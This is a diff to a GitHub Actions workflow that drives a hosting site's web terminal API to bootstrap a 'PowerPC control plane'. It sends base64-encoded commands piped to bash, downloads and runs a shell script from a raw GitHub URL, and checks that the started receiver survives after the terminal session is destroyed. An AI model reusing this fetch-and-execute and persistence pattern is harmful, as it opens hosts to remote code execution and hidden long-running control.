@@ -1,4 +1,4 @@
-name: Probe PowerPC Control Plane
+name: Bootstrap PowerPC Control Plane
 
 on:
   push:
@@ -10,23 +10,168 @@ permissions:
   contents: read
 
 jobs:
-  probe:
+  bootstrap:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 12
     steps:
-      - name: Probe identity and status
+      - name: Bootstrap through existing terminal transport
         shell: bash
         run: |
           set -euo pipefail
-          base="https://www.powerpc-darwin.org/.well-known/powerpc-control-v1"
-          for name in identity status; do
-            echo "===${name^^}==="
-            code="$(curl -L --connect-timeout 10 --max-time 20 -sS -o "/tmp/$name.json" -w '%{http_code}' "$base/$name.json" || true)"
-            echo "HTTP=$code"
-            if [[ -s "/tmp/$name.json" ]]; then
-              cat "/tmp/$name.json"
-              echo
-            fi
-          done
+          BASE="https://www.powerpc-darwin.org"
+          CREATE=/tmp/create.json
+          OUT=/tmp/terminal.out
+          : > "$OUT"
 
-# trigger: second-pass
+          create_session() {
+            local code
+            code="$(curl -sS --connect-timeout 10 --max-time 30 -o "$CREATE" -w '%{http_code}'               -H 'Content-Type: application/json'               -d '{"cols":100,"rows":30}'               "$BASE/terminal/api/session" || true)"
+            if [ "$code" = "409" ]; then
+              code="$(curl -sS --connect-timeout 10 --max-time 30 -o "$CREATE" -w '%{http_code}'                 -H 'Content-Type: application/json'                 -d '{"cols":100,"rows":30,"resume_existing":true}'                 "$BASE/terminal/api/session" || true)"
+            fi
+            echo "TERMINAL_CREATE_HTTP=$code"
+            if [ "$code" != "200" ]; then
+              echo "TERMINAL_MACHINE_CALLABLE=FAIL"
+              return 20
+            fi
+            SID="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["session_id"])' "$CREATE")"
+            CSRF="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["csrf_token"])' "$CREATE")"
+            CURSOR="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(int(d.get("cursor",0)))' "$CREATE")"
+            export SID CSRF CURSOR
+            echo "TERMINAL_MACHINE_CALLABLE=PASS"
+          }
+
+          send_script() {
+            local script_file="$1"
+            local payload req code
+            payload="$(base64 -w0 < "$script_file")"
+            req="$(python3 -c 'import json,sys; print(json.dumps({"data_b64":sys.argv[1]},separators=(",",":")))' "$payload")"
+            code="$(curl -sS --connect-timeout 10 --max-time 30 -o /tmp/input.json -w '%{http_code}'               -H 'Content-Type: application/json'               -H "X-Terminal-CSRF: $CSRF"               -d "$req"               "$BASE/terminal/api/session/$SID/input" || true)"
+            [ "$code" = "200" ] || { echo "TERMINAL_INPUT=FAIL http=$code"; return 21; }
+            echo "TERMINAL_INPUT=PASS"
+          }
+
+          poll_marker() {
+            local marker="$1"
+            local loops="${2:-24}"
+            local i code data
+            for ((i=0;i<loops;i++)); do
+              code="$(curl -sS --connect-timeout 10 --max-time 35 -o /tmp/output.json -w '%{http_code}'                 -H "X-Terminal-CSRF: $CSRF"                 "$BASE/terminal/api/session/$SID/output?cursor=$CURSOR" || true)"
+              [ "$code" = "200" ] || { sleep 2; continue; }
+              data="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d.get("data_b64",""))' /tmp/output.json)"
+              CURSOR="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(int(d.get("next_cursor",0)))' /tmp/output.json)"
+              if [ -n "$data" ]; then printf '%s' "$data" | base64 -d >> "$OUT"; fi
+              if grep -aFq "$marker" "$OUT"; then return 0; fi
+            done
+            return 1
+          }
+
+          destroy_session() {
+            local code
+            code="$(curl -sS --connect-timeout 10 --max-time 20 -o /tmp/delete.json -w '%{http_code}'               -X DELETE -H "X-Terminal-CSRF: $CSRF"               "$BASE/terminal/api/session/$SID" || true)"
+            echo "TERMINAL_DESTROY_HTTP=$code"
+            [ "$code" = "200" ]
+          }
+
+          create_session
+
+          cat > /tmp/bootstrap.remote <<'REMOTE'
+          set +e
+          echo "CONTROL_BOOTSTRAP_EXECUTION_START"
+          TMP="$(mktemp)"
+          URL="https://raw.githubusercontent.com/Christopher-Charman/open-webui/daaa4e3226e81788858eb3d209d956d728347c93/bootstrap-relay/permanent-control/bootstrap-control-plane.sh"
+          curl -fsSL --retry 4 "$URL" -o "$TMP"
+          FETCH_RC=$?
+          BOOT_RC=127
+          if [ "$FETCH_RC" -eq 0 ]; then
+            chmod 700 "$TMP"
+            sh -n "$TMP"
+            SYNTAX_RC=$?
+            if [ "$SYNTAX_RC" -eq 0 ]; then
+              "$TMP"
+              BOOT_RC=$?
+            else
+              BOOT_RC=$SYNTAX_RC
+            fi
+          else
+            BOOT_RC=$FETCH_RC
+          fi
+          rm -f "$TMP"
+          echo "CONTROL_BOOTSTRAP_EXEC_RC=$BOOT_RC"
+
+          if [ -x /home/storage/781/4477781/user/webapp/bin/powerpc-control ]; then
+            /home/storage/781/4477781/user/webapp/bin/powerpc-control restart
+            echo "OWNED_RECEIVER_RESTART_RC=$?"
+            sleep 3
+            /home/storage/781/4477781/user/webapp/bin/powerpc-control status
+            echo "OWNED_RECEIVER_STATUS_RC=$?"
+          else
+            echo "OWNED_RECEIVER_BINARY=MISSING"
+          fi
+
+          if [ -x /home/storage/781/4477781/user/webapp/bin/secure-mcp-keepalive ]; then
+            /home/storage/781/4477781/user/webapp/bin/secure-mcp-keepalive status
+            echo "SECURE_MCP_STATUS_RC=$?"
+          else
+            echo "SECURE_MCP_KEEPALIVE_BINARY=MISSING"
+          fi
+          echo "__CONTROL_BOOTSTRAP_DONE__"
+REMOTE
+
+          PAYLOAD="$(base64 -w0 < /tmp/bootstrap.remote)"
+          printf 'printf %%s %q | base64 -d | bash\r' "$PAYLOAD" > /tmp/bootstrap.send
+          send_script /tmp/bootstrap.send
+          poll_marker "__CONTROL_BOOTSTRAP_DONE__" 30 || { echo "CONTROL_BOOTSTRAP_OUTPUT=TIMEOUT"; exit 22; }
+
+          grep -aFq "OWNED_RECEIVER_HOST=PASS" "$OUT" && echo "OWNED_RECEIVER_HOST=PASS" || echo "OWNED_RECEIVER_HOST=NOT_PROVEN"
+          if grep -aFq "SECURE_MCP_LIFECYCLE_HOST=PASS" "$OUT"; then
+            echo "SECURE_MCP_LIFECYCLE_HOST=PASS"
+          elif grep -aFq "SECURE_MCP_LIFECYCLE_HOST=PARTIAL" "$OUT"; then
+            echo "SECURE_MCP_LIFECYCLE_HOST=PARTIAL"
+          else
+            echo "SECURE_MCP_LIFECYCLE_HOST=NOT_PROVEN"
+          fi
+          grep -aFq "POWERPC_CONTROL=RUNNING" "$OUT" && echo "OWNED_RECEIVER_RUNTIME=RUNNING" || echo "OWNED_RECEIVER_RUNTIME=NOT_PROVEN"
+          grep -aFq "SECURE_MCP_KEEPALIVE=HEALTHY" "$OUT" && echo "SECURE_MCP_RUNTIME=HEALTHY" || echo "SECURE_MCP_RUNTIME=NOT_HEALTHY_OR_UNPROVEN"
+
+          code="$(curl -sS --connect-timeout 10 --max-time 20 -o /tmp/identity.json -w '%{http_code}'             "$BASE/static/powerpc-control-v1/identity.json?t=$(date +%s)" || true)"
+          echo "PUBLIC_IDENTITY_HTTP=$code"
+          if [ "$code" = "200" ] && python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d.get("protocol")=="powerpc-control-v1"; assert d.get("runtime_id")=="fasthost.powerpc"; assert d.get("state")=="ready"' /tmp/identity.json; then
+            echo "PUBLIC_IDENTITY=PASS"
+          else
+            echo "PUBLIC_IDENTITY=FAIL"
+          fi
+
+          destroy_session
+          echo "ORIGINATING_TERMINAL_DESTROYED=PASS"
+          sleep 35
+
+          code="$(curl -sS --connect-timeout 10 --max-time 20 -o /tmp/status-after.json -w '%{http_code}'             "$BASE/static/powerpc-control-v1/status.json?t=$(date +%s)" || true)"
+          echo "POST_DESTROY_STATUS_HTTP=$code"
+          if [ "$code" = "200" ] && python3 -c 'import json,sys,time; d=json.load(open(sys.argv[1])); assert d.get("protocol")=="powerpc-control-v1"; assert d.get("state")=="ready"; assert int(time.time())-int(d.get("heartbeat_at",0)) < 90' /tmp/status-after.json; then
+            echo "POST_TERMINAL_RECEIVER_SURVIVAL=PASS"
+          else
+            echo "POST_TERMINAL_RECEIVER_SURVIVAL=FAIL"
+            exit 23
+          fi
+
+          : > "$OUT"
+          create_session
+          cat > /tmp/fresh.remote <<'REMOTE'
+          set +e
+          /home/storage/781/4477781/user/webapp/bin/powerpc-control status
+          echo "FRESH_OWNED_STATUS_RC=$?"
+          if [ -x /home/storage/781/4477781/user/webapp/bin/secure-mcp-keepalive ]; then
+            /home/storage/781/4477781/user/webapp/bin/secure-mcp-keepalive status
+            echo "FRESH_SECURE_MCP_STATUS_RC=$?"
+          fi
+          /home/storage/781/4477781/user/webapp/bin/local-mcp </dev/null >/dev/null 2>&1
+          echo "__FRESH_TERMINAL_DONE__"
+REMOTE
+          PAYLOAD="$(base64 -w0 < /tmp/fresh.remote)"
+          printf 'printf %%s %q | base64 -d | bash\r' "$PAYLOAD" > /tmp/fresh.send
+          send_script /tmp/fresh.send
+          poll_marker "__FRESH_TERMINAL_DONE__" 12 || { echo "FRESH_TERMINAL_STATUS=TIMEOUT"; exit 24; }
+          grep -aFq "POWERPC_CONTROL=RUNNING" "$OUT" && echo "FRESH_TERMINAL_OWNED_STATUS=PASS" || { echo "FRESH_TERMINAL_OWNED_STATUS=FAIL"; exit 25; }
+          destroy_session
+          echo "FRESH_TERMINAL_DESTROYED=PASS"
